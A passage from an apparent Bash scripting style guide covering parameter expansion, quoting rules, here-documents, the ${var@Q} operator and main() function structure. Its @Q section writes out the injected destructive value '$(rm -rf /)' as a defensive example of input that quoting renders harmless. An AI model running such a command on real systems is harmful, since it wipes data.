- **Consistent derivation** - if one path derives from APP_NAME, all should
- **Environment fallbacks** - use `${XDG_VAR:-$HOME/default}` pattern
- **Make readonly last** - after all parsing and derivation complete
- **Clear dependency chain** - base → derived1 → derived2
- **Section comments** - "# Derived from PREFIX" or "# Derived paths"
- **Update functions** - centralize derivation logic when many variables

**Key principle:** Derived variables implement the DRY (Don't Repeat Yourself) principle at the configuration level. Define each piece of information once (the base value), then derive everything else from it. This ensures consistency when base values change and makes scripts more maintainable. Always group derived variables with explanatory comments, and remember to update them when base variables change during execution. The mental model is simple: base values are inputs, derived variables are computed outputs.


---


**Rule: BCS0210**

## Parameter Expansion & Braces Usage

**Rule: BCS0210** (Merged from BCS0301 + BCS0302)

Variable expansion operations and when to use braces.

---

#### General Rule

Always quote variables with `"$var"` as the default form. Only use braces `"${var}"` when syntactically necessary.

**Rationale:** Braces add visual noise without providing value when not required. Using them only when necessary makes code cleaner and the necessary cases stand out.

---

#### Parameter Expansion Operations

```bash
# Pattern removal
SCRIPT_NAME=${SCRIPT_PATH##*/}  # Remove longest prefix pattern
SCRIPT_DIR=${SCRIPT_PATH%/*}    # Remove shortest suffix pattern

# Default values
${var:-default}                 # Use default if unset or null
${var:=default}                 # Set default if unset or null
${var:+alternate}               # Use alternate if set and non-null

# Substrings
${var:0:5}                      # First 5 characters
${var:(-3)}                     # Last 3 characters

# Pattern substitution
${var//old/new}                 # Replace all occurrences
${var/old/new}                  # Replace first occurrence
${var/#pattern/replace}         # Replace prefix
${var/%pattern/replace}         # Replace suffix

# Case conversion (Bash 4.0+)
${var,,}                        # All lowercase
${var^^}                        # All uppercase
${var~}                         # Toggle first char
${var~~}                        # Toggle all chars

# Special parameters
"${@:2}"                        # All args from 2nd onwards
"${10}"                         # Positional param > 9
${#var}                         # String length
${!prefix@}                     # Variables starting with prefix
```

---

#### When Braces Are REQUIRED

1. **Parameter expansion operations:**
   ```bash
   "${var##*/}"        # Pattern removal
   "${var:-default}"   # Default value
   "${var:0:5}"        # Substring
   "${var//old/new}"   # Substitution
   "${var,,}"          # Case conversion
   ```

2. **Variable concatenation (no separator):**
   ```bash
   "${var1}${var2}"    # Adjacent variables
   "${prefix}suffix"   # Variable + alphanumeric
   ```

3. **Array access:**
   ```bash
   "${array[index]}"   # Element access
   "${array[@]}"       # All elements
   "${#array[@]}"      # Array length
   ```

4. **Special parameter expansion:**
   ```bash
   "${@:2}"            # Positional from 2nd
   "${10}"             # Positional > 9
   "${!var}"           # Indirect expansion
   ```

---

#### When Braces Are NOT Required

**Standalone variables:**
```bash
# ✓ Correct
"$var"  "$HOME"  "$SCRIPT_DIR"

# ✗ Wrong - unnecessary braces
"${var}"  "${HOME}"  "${SCRIPT_DIR}"
```

**Path concatenation with separators:**
```bash
# ✓ Correct - separators delimit naturally
"$PREFIX"/bin
"$PREFIX/bin"
"$SCRIPT_DIR"/build/lib

# ✗ Wrong - unnecessary braces
"${PREFIX}"/bin
"${SCRIPT_DIR}"/build
```

**In strings with separators:**
```bash
# ✓ Correct
echo "Installing to $PREFIX/bin"
info "Found $count files"

# ✗ Wrong
echo "Installing to ${PREFIX}/bin"
info "Found ${count} files"
```

---

#### Edge Cases

**When next character is alphanumeric AND no separator:**
```bash
# Braces required
"${var}_suffix"      # Prevents $var_suffix
"${prefix}123"       # Prevents $prefix123

# No braces needed - separator present
"$var-suffix"        # Dash separates
"$var.suffix"        # Dot separates
"$var/path"          # Slash separates
```

---

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no sep) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |

**Key Principle:** Use `"$var"` by default. Only add braces when required for correct parsing.


---


**Rule: BCS0211**

## Boolean Flags Pattern

For boolean state tracking, use integer variables with `declare -i` or `local -i`:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0
declare -i NON_INTERACTIVE=0
declare -i UNINSTALL=0
declare -i DRY_RUN=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags descriptively in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` in conditionals (returns true for non-zero, false for zero)
- Avoid mixing boolean flags with integer counters - use separate variables


---


**Rule: BCS0300**

# Strings & Quoting

This section establishes critical quoting rules that prevent word-splitting errors and make code intent clear. The fundamental principle: **single quotes** for static strings, **double quotes** when variable expansion is needed.

**7 Rules:**

1. **Quoting Fundamentals** (BCS0301) - Core rules for static vs. dynamic strings
2. **Command Substitution** (BCS0302) - Quoting `$(...)` results
3. **Quoting in Conditionals** (BCS0303) - Variable quoting in `[[ ]]`
4. **Here Documents** (BCS0304) - Delimiter quoting for heredocs
5. **printf Patterns** (BCS0305) - Format string and argument quoting
6. **Parameter Quoting** (BCS0306) - Using `${param@Q}` for safe display
7. **Anti-Patterns** (BCS0307) - Common quoting mistakes to avoid

**Key principle:** Single quotes signal "literal text" while double quotes signal "variable expansion needed."


---


**Rule: BCS0301**

## Quoting Fundamentals

**Rule: BCS0301** (Merged from BCS0401 + BCS0402 + BCS0403 + BCS0404)

Core quoting rules for strings, variables, and literals.

---

#### The Fundamental Rule

**Single quotes** for static strings, **double quotes** when variable expansion needed.

```bash
# ✓ Correct - single quotes for static
info 'Checking prerequisites...'
error 'Failed to connect'
[[ "$status" == 'success' ]]

# ✓ Correct - double quotes for variables
info "Found $count files"
die 1 "File '$SCRIPT_DIR/testfile' not found"
echo "$SCRIPT_NAME $VERSION"
```

---

#### Why Single Quotes for Static Strings

1. **Performance**: Slightly faster (no variable/escape parsing)
2. **Clarity**: Signals "this is literal, no substitution"
3. **Safety**: Prevents accidental expansion
4. **No escaping**: `$`, `` ` ``, `\` are literal

```bash
# Single quotes preserve special characters
msg='The variable $PATH will not expand'
sql='SELECT * FROM users WHERE name = "John"'
regex='^\$[0-9]+\.[0-9]{2}$'
```

---

#### Mixed Quoting Pattern

Nest single quotes inside double quotes for literal display:

```bash
# Variable with visible quotes around value
die 1 "Unknown option '$1'"
warn "Cannot access '$file_path'"
error "Permission denied for '$dir'"
```

---

#### One-Word Literal Exception

Simple alphanumeric values (containing only `a-zA-Z0-9_-./`) may be unquoted:

```bash
# ✓ Acceptable and Standard
STATUS=success
VERSION=1.0.0
[[ "$level" == INFO ]]

# ✓ Acceptable
STATUS='success'
VERSION='1.0.0'
[[ "$level" == 'INFO' ]]
```

**Mandatory quoting required for:**
- Spaces: `'File not found'`
- Special characters: `'user@domain.com'`, `'*.txt'`
- Empty strings: `''`
- Values with `$`, quotes, backslashes

---

#### Anti-Patterns

```bash
# ✗ Wrong - double quotes for static strings
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == active ]]
```

```bash
# ✗ Wrong - special characters unquoted
EMAIL=user@domain.com
PATTERN=*.log

# ✓ Correct
EMAIL='user@domain.com'
PATTERN='*.log'
```

---

#### Path Concatenation Quoting

When concatenating variables with literal paths, quote the variable portion separately from the literal:

```bash
# ✓ RECOMMENDED - separate quoting for clarity
"$PREFIX"/bin
"$SCRIPT_DIR"/data/"$filename"
cat "$dir"/"$file"
[[ -f "$CONFIG_DIR"/hosts.conf ]]
install -m 755 "$TEMP_DIR"/"$file" "$INSTALL_DIR"/"$file"

# ACCEPTABLE - variable and literal combined
"$PREFIX/bin"
"$SCRIPT_DIR/data/$filename"
cat "$dir/$file"
```

**Rationale:**
- Makes variable boundaries visually explicit
- Improves readability when paths have multiple variables
- Consistent with how shell parses (variable ends at unquoted character)

**Note:** Both forms work correctly. The separate quoting is a style preference that improves clarity, especially in complex paths.

---

#### Quick Reference

| Content | Quote Type | Example |
|---------|------------|---------|
| Static text | Single | `'Processing...'` |
| With variable | Double | `"Found $count files"` |
| Variable in quotes | Mixed | `"Option '$1' invalid"` |
| One-word literal | Optional | `STATUS=success` or `STATUS='success'` |
| Special chars | Single | `'user@example.com'` |
| Empty string | Single | `VAR=''` |
| Path with separator | Separate | `"$var"/path` |

**Key principle:** Use single quotes as the default. Switch to double quotes only when expansion is needed.


---


**Rule: BCS0302**

## Command Substitution

**Rule: BCS0302** (From BCS0405)

Quoting rules for command substitution.

---

#### Rule

Use double quotes when strings include command substitution:

```bash
# ✓ Correct - double quotes for command substitution
echo "Current time: $(date +%T)"
info "Found $(wc -l < "$file") lines"
```

When assigning variables, double quotes around the value are only required if there is concatenation of values in the string:

```
# ✓ Correct - double quotes for command substitution
VERSION=$(git describe --tags 2>/dev/null || echo 'unknown')
TIMESTAMP=$(date -Ins)
BASEDIR=$PREFIX

# ✗ Wrong - unnecessary double quotes
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"
TIMESTAMP="$(date -Ins)"
BASEDIR="$PREFIX"

# ✓ Correct - double quotes for command substitution
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')".beta
TIMESTAMP="$(date -Ins)"-Jakarta
BASEDIR="$PREFIX"/config
```

---

#### Always Quote the Result

```bash
# ✓ Correct - quoted result
result=$(command)
echo "$result"

# ✗ Wrong - unquoted result
echo $result    # Word splitting occurs!
```

---

**Key principle:** Command substitution results should always be quoted to preserve whitespace and prevent word splitting.


---


**Rule: BCS0303**

## Quoting in Conditionals

**Rule: BCS0303**

Variable quoting in test expressions.

---

#### The Rule

**Always quote variables** in conditionals. Static comparison values follow normal rules (single quotes for literals with breaking chars).

```bash
# ✓ Correct - variable quoted
[[ -f "$file" ]]
[[ "$name" == value ]]

# ✗ Wrong - unquoted variable
[[ -f $file ]]
[[ $name == value ]]
```

---

#### Why Quote Variables

1. **Word splitting**: `$file` with spaces becomes multiple arguments
2. **Glob expansion**: `$file` with `*` expands to matching files
3. **Empty values**: Unquoted empty variables cause syntax errors
4. **Security**: Prevents injection attacks

---

#### Common Patterns

```bash
# File tests
[[ -f "$file" ]]
[[ -d "$directory" && -r "$directory" ]]

# String comparisons (variable quoted, literal single-quoted)
[[ "$action" == 'start' ]]
[[ -z "$value" ]]
[[ -n "$result" ]]

# Numeric comparisons
declare -i count=0
((count > 10))

# Pattern matching (pattern unquoted for globbing)
[[ "$filename" == *.txt ]]        # Glob match
[[ "$filename" == '*.txt' ]]      # Literal match

# Regex (pattern variable unquoted)
pattern='^[0-9]+$'
[[ "$input" =~ $pattern ]]        # ✓ Pattern unquoted
[[ "$input" =~ "$pattern" ]]      # ✗ Becomes literal
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]] # Breaks with spaces
[[ $name == value with breaking chars ]] # Breaks with spaces

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct
[[ "$mode" == 'production' ]]
[[ "$mode" == production ]]  # One-word literal OK
```

---

**Key principle:** Variable quoting in conditionals is mandatory. Quote all variables: `[[ -f "$file" ]]`.


---


**Rule: BCS0304**

## Here Documents

**Rule: BCS0304** (Merged from BCS0408 + BCS1104)

Quoting rules for here documents.

---

#### Delimiter Quoting

| Delimiter | Variable Expansion | Use Case |
|-----------|-------------------|----------|
| `<<EOF` | Yes | Dynamic content with variables |
| `<<'EOF'` | No | Literal content (JSON, SQL) |
| `<<"EOF"` | No | Same as single quotes |

---

#### With Variable Expansion

```bash
# Unquoted delimiter - variables expand
cat <<EOF
User: $USER
Home: $HOME
Time: $(date)
EOF
```

---

#### Literal Content (No Expansion)

```bash
# Single-quoted delimiter - no expansion
cat <<'EOF'
{
  "name": "$APP_NAME",
  "version": "$VERSION"
}
EOF
```

---

#### Indented Content

```bash
# <<- removes leading tabs (not spaces)
if condition; then
	cat <<-EOF
	Indented content
	Aligned with code
	EOF
fi
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted when literal needed
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF
# SQL injection risk if $name is attacker-controlled!

# ✓ Correct - quoted for literal SQL
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

**Key principle:** Quote the delimiter (`<<'EOF'`) to prevent expansion; leave unquoted for variable substitution.


---


**Rule: BCS0305**

## printf Patterns

**Rule: BCS0305**

Quoting rules for printf and echo.

---

#### Basic Pattern

```bash
# Format string: single quotes (static)
# Variables: double-quoted as arguments
printf '%s: %d files found\n' "$name" "$count"

# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
printf 'Found %d files in %s\n' "$count" "$dir"
```

---

#### Format String Escapes

```bash
# Common format specifiers
printf '%s\n'   "$string"       # String
printf '%d\n'   "$integer"      # Decimal
printf '%f\n'   "$float"        # Float
printf '%x\n'   "$hex"          # Hexadecimal
printf '%%\n'                   # Literal %
```

---

#### Prefer printf Over echo -e

```bash
# ✗ Avoid - echo -e behavior varies
echo -e "Line1\nLine2"

# ✓ Prefer - printf is consistent
printf 'Line1\nLine2\n'

# Or use $'...' for escape sequences
echo $'Line1\nLine2'
```

---

**Key principle:** Single quotes for format strings, double quotes for variable arguments.


---


**Rule: BCS0306**

## Parameter Quoting with @Q

**Rule: BCS0306**

Using `${parameter@Q}` for safe display of user input.

---

#### The @Q Operator

`${parameter@Q}` expands to a shell-quoted value that can be safely displayed and re-used.

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)' (safe, literal)
```

---

#### Primary Use: Error Messages

```bash
# ✗ Wrong - injection risk
die 2 "Unknown option $1"
die 2 "Unknown option '$1'"

# ✓ Correct - safe display
die 2 "Unknown option ${1@Q}"

# Validation function
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

---

#### Dry-Run Display

```bash
run_command() {
  local -a cmd=("$@")
  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi
  "${cmd[@]}"
}
```

---

#### Comparison

| Input | `$var` | `"$var"` | `${var@Q}` |
|-------|--------|----------|------------|
| `hello world` | splits | `hello world` | `'hello world'` |
| `$(date)` | executes | executes | `'$(date)'` |
| `*.txt` | globs | `*.txt` | `'*.txt'` |

---

#### When to Use

**Use @Q for:**
- Error messages: `die 2 "Invalid ${opt@Q}"`
- Logging user input: `info "Processing ${file@Q}"`
- Dry-run output: `info "[DRY-RUN] ${cmd@Q}"`

**Don't use @Q for:**
- Normal variable expansion: `process "$file"`
- Comparisons: `[[ "$var" == "$value" ]]`

---

**Key principle:** Use `${parameter@Q}` when displaying user input in error messages to prevent injection.


---


**Rule: BCS0307**

## Quoting Anti-Patterns

**Rule: BCS0307**

Common quoting mistakes to avoid.

---

#### Category 1: Double Quotes for Static Strings

```bash
# ✗ Wrong
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

# ✓ Acceptable
info 'Checking prerequisites...'
[[ "$status" == active ]]
```

---

#### Category 2: Unquoted Variables

```bash
# ✗ Wrong - word splitting/glob expansion
[[ -f $file ]]
echo $result
rm $temp_file

# ✓ Correct
[[ -f "$file" ]]
echo "$result"
rm "$temp_file"
```

---

#### Category 3: Unnecessary Braces

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"
path="${CONFIG_DIR}/app.conf"

# ✓ Correct
echo "$HOME"/bin
path="$CONFIG_DIR"/app.conf

# ✓ Acceptable
echo "$HOME/bin"
path="$CONFIG_DIR/app.conf"

# Braces ARE needed for:
"${var:-default}"     # Default value
"${file##*/}"         # Parameter expansion
"${array[@]}"         # Array expansion
"${var1}${var2}"      # Adjacent variables
```

---

#### Category 4: Unquoted Arrays

```bash
# ✗ Wrong
for item in ${items[@]}; do

# ✓ Correct
for item in "${items[@]}"; do
```

---

#### Category 5: Glob Expansion Danger

```bash
pattern='*.txt'

# ✗ Wrong
echo $pattern       # Expands to all .txt files!

# ✓ Correct
echo "$pattern"     # Outputs literal: *.txt
```

---

#### Category 6: Here-doc Delimiter

```bash
# ✗ Wrong - variables expand unexpectedly
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal content
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

---

#### Quick Reference

| Context | Correct | Wrong |
|---------|---------|-------|
| Static string | `'literal'` | `"literal"` |
| Variable | `"$var"` | `$var` |
| Path with var | `"$HOME"/bin` | `"${HOME}/bin"` |
| Conditional | `[[ -f "$file" ]]` | `[[ -f $file ]]` |
| Array | `"${arr[@]}"` | `${arr[@]}` |
| Static literal | `== 'value'` | `== "value"` |

---

**Key principle:** Single quotes for static text, double quotes for variables, avoid unnecessary braces, always quote variables.


---


**Rule: BCS0400**

# Functions

This section defines function definition patterns, naming conventions (lowercase_with_underscores), and organization principles. It mandates the `main()` function for scripts exceeding 200 lines to improve structure and testability, explains function export for sourceable libraries (`declare -fx`), and details production optimization practices where unused utility functions should be removed once scripts mature. Functions should be organized bottom-up: messaging functions first, then helpers, then business logic, with `main()` last—this ensures each function can safely call previously defined functions and readers understand primitives before composition.


---


**Rule: BCS0401**

## Function Definition Pattern

```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```


---


**Rule: BCS0402**

## Function Names
Use lowercase with underscores to match shell conventions and avoid conflicts with built-in commands.

```bash
# ✓ Good - lowercase with underscores
my_function() {
  …
}

process_log_file() {
  …
}

# ✓ Private functions use leading underscore
_my_private_function() {
  …
}

_validate_input() {
  …
}

# ✗ Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  …
}

PROCESS_FILE() {    # Don't do this
  …
}
```

**Rationale:**
- **Lowercase with underscores**: Matches standard Unix/Linux utility naming (e.g., `grep`, `sed`, `file_name`)
- **Avoid CamelCase**: Can be confused with variables or commands
- **Underscore prefix for private**: Clear signal that function is for internal use only
- **Consistency**: All built-in bash commands are lowercase

**Anti-patterns to avoid:**
```bash
# ✗ Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

# ✓ If you must wrap built-ins, use a different name
change_dir() {
  builtin cd "$@" && ls
}

# ✗ Don't use special characters
my-function() {  # Dash creates issues in some contexts
  …
}
```


---


**Rule: BCS0403**

## Main Function

**Always include a `main()` function for scripts longer than approximately 200 lines. The main function serves as the single entry point, orchestrating the script's logic and making the code more organized, testable, and maintainable. Place `main "$@"` at the bottom of the script, just before the `#fin` marker.**

**Rationale:**

- **Single Entry Point**: Provides clear script execution flow starting from one well-defined function
- **Testability**: Scripts can be sourced for testing without executing; functions can be tested individually
- **Organization**: Separates initialization, argument parsing, and main logic into clear sections
- **Debugging**: Easy to add debugging output or dry-run logic in one central location
- **Scope Control**: All script execution variables can be local to main, preventing global namespace pollution
- **Exit Code Management**: Centralized return/exit code handling for consistent error reporting

**When to use main():**

```bash
# Use main() when:
# - Script is longer than ~200 lines
# - Script has multiple functions
# - Script requires argument parsing
# - Script needs to be testable
# - Script has complex logic flow

# Can skip main() when:
# - Script is trivial (< 200 lines)
# - Script is a simple wrapper
# - Script has no functions
# - Script is linear (no branching)
```

**Basic main() structure:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Functions
# ============================================================================

# ... helper functions ...

# ============================================================================
# Main
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) show_help; return 0 ;;
    # short options...
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done
  # Argument validation
  : ...

  # Main logic
  info 'Starting processing...'
  : ...

  # ... business logic ...
  : ...

  # Return success
  return 0
}

# Script invocation
main "$@"
#fin
```

**Main function with argument parsing:**

```bash
main() {
  # Local variables for parsed options
  local -i verbose=0
  local -i dry_run=0
  local -- output_file=''
  local -a input_files=()

  # Parse arguments
  while (($#)); do case $1 in
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file=$1
      ;;
    -v|--verbose) verbose=1 ;;
    -q|--quiet)   verbose=0 ;;
    -h|--help)
      usage
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option ${1@Q}"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Remaining arguments after --
  input_files+=("$@")

  # Make parsed values readonly
  readonly -- verbose dry_run output_file
  readonly -a input_files

  # Validate arguments
  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    usage
    return 22
  fi

  # Main logic
  if ((verbose)); then
    info "Processing ${#input_files[@]} files"
    ((dry_run)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Process files
  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done

  return 0
}
```

**Main function with setup/cleanup:**

```bash
# Cleanup function
cleanup() {
  local -i exit_code=${1:-$?}

  # Cleanup operations
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi

  return "$exit_code"
}

main() {
  # Setup trap for cleanup
  trap cleanup EXIT

  # Create temp directory
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR

  # Main logic
  info "Using temp directory ${TEMP_DIR@Q}"

  # ... processing ...

  # Cleanup happens automatically via trap
  return 0
}

main "$@"
#fin
```

**Main function with error handling:**

```bash
main() {
  local -i errors=0

  # Parse arguments
  # ...

  # Process items with error tracking
  local -- item
  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      errors+=1
    fi
  done

  # Report results
  if ((errors)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Main function enabling sourcing for tests:**

```bash
# ...
# ...
# Script can be sourced for testing
# Only execute main if script is run directly (not sourced)
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Do set here
set -euo pipefail

main() {
  # ... script logic ...
  return 0
}

main "$@"
#fin
```

**Complete example with main():**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case ${FUNCNAME[1]} in
    info) prefix+=" ${CYAN}◉${NC}" ;;
    error) prefix+=" ${RED}✗${NC}" ;;
    *) ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Documentation Functions
# ============================================================================

show_help() {
  cat <<EOF
$SCRIPT_NAME $VERSION - Process files

Process files with various options.

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Options:
  -v, --verbose     Enable verbose output
  -q, --quiet       Disable verbose output
  -n, --dry-run     Show what would be done
  -o, --output DIR  Output directory
  -h, --help        Show this help

Examples:
  $SCRIPT_NAME file.txt
  $SCRIPT_NAME -v -o /tmp file1.txt file2.txt
  $SCRIPT_NAME -n --output /backup *.txt
EOF
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic Functions
# ============================================================================

process_file() {
  local -- file=$1

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found ${file@Q}"
    return 2
  fi

  info "Processing ${file@Q}"

  # Process file logic
  # ...

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Declare option variables
  local -i verbose=0
  local -i dry_run=0
  local -- output_dir=''
  local -a input_files=()

  # Parse command-line arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_dir=$1
      ;;
    -h|--help)
      show_help
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option ${1@Q}"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Collect remaining arguments
  input_files+=("$@")

  # Make options readonly
  readonly -- verbose dry_run output_dir
  readonly -a input_files

  # Validate arguments
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  if [[ -n "$output_dir" && ! -d "$output_dir" ]]; then
    error "Output directory not found ${output_dir@Q}"
    return 2
  fi

  # Display configuration
  if ((verbose)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    [[ -n "$output_dir" ]] && info "Output: $output_dir"
    ((dry_run)) && info '[DRY-RUN] Mode enabled' ||:
  fi

  # Process each file
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${input_files[@]}"; do
    if ((dry_run)); then
      info "[DRY-RUN] Would process ${file@Q}"
      success_count+=1
    elif process_file "$file"; then
      success_count+=1
    else
      error_count+=1
    fi
  done

  # Report results
  if ((verbose)); then
    info "Processed: $success_count files"
    ((error_count)) && info "Errors: $error_count" ||:
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no main function in complex script
#!/bin/bash
set -euo pipefail

# ... 200 lines of code directly in script ...
# Hard to test, hard to organize

# ✓ Correct - main function
#!/bin/bash
set -euo pipefail

# ... helper functions ...

main() {
  # Script logic
}

main "$@"
#fin

# ✗ Wrong - main() not at end
main() {
  # ...
}

main "$@"  # Called here

# More functions defined after main is called
helper_function() {
  # ...
}
# This function is defined after main executes!

# ✓ Correct - main() at end, called last
helper_function() {
  # ...
}

main() {
  # Can call helper_function
}

main "$@"
#fin

# ✗ Wrong - parsing arguments outside main
verbose=0
dry_run=0

while (($#)); do
  # ... parse args ...
done

main() {
  # Uses global variables
}

main "$@"  # Arguments already consumed!

# ✓ Correct - parsing in main
main() {
  local -i verbose=0
  local -i dry_run=0

  while (($#)); do
    # ... parse args ...
  done

  readonly -- verbose dry_run
  # ... use variables ...
}

main "$@"

# ✗ Wrong - not passing arguments
main() {
  # Expects arguments but they're not passed
}

main  # Missing "$@"!

# ✓ Correct - pass all arguments
main "$@"

# ✗ Wrong - mixing global and local logic
total=0  # Global

main() {
  local -i count=0
  # Mixes global and local state
  ((total+=count)) # note: total not defined as int, thus (()) required
}

# ✓ Correct - all logic in main
main() {
  local -i total=0
  local -i count=0
  # All local, clean scope
  total+=count
}
```

**Edge cases:**

**1. Script needs global configuration:**

```bash
# Global configuration (before functions)
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Parse arguments and modify globals
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option ${1@Q}" ;;
  esac; shift; done

  # Make globals readonly
  readonly -- VERBOSE DRY_RUN

  # ... rest of logic ...
}

main "$@"
```

**2. Script has initialization code:**

```bash
# Initialization before main
declare -A CONFIG=()

load_config() {
  # Load configuration into global array
  # ...
}

# Load before main
load_config

main() {
  # Use CONFIG array
  echo "App: ${CONFIG[app_name]}"
}

main "$@"
```

**3. Script is library and executable:**

```bash
# Library functions
utility_function() {
  # ...
}

# Main function for when executed
main() {
  # ...
}

# Only run main if executed (not sourced)
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return

main "$@"
#fin
```

**4. Multiple main scenarios:**

```bash
# Different modes
main_install() {
  # Installation logic
}

main_uninstall() {
  # Uninstallation logic
}

main() {
  local -- mode=${1:-}

  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode ${mode@Q}" ;;
  esac
}

main "$@"
```

**Testing with main():**

```bash
# Script: myapp.sh
main() {
  local -i value=$1
  ((value * 2))
  echo "$value"
}

# Only execute if run directly
[[ "${BASH_SOURCE[0]}" == "${0}" ]] || return
main "$@"

# Test file: test_myapp.sh
#!/bin/bash
source ./myapp.sh  # Source without executing

# Test main function
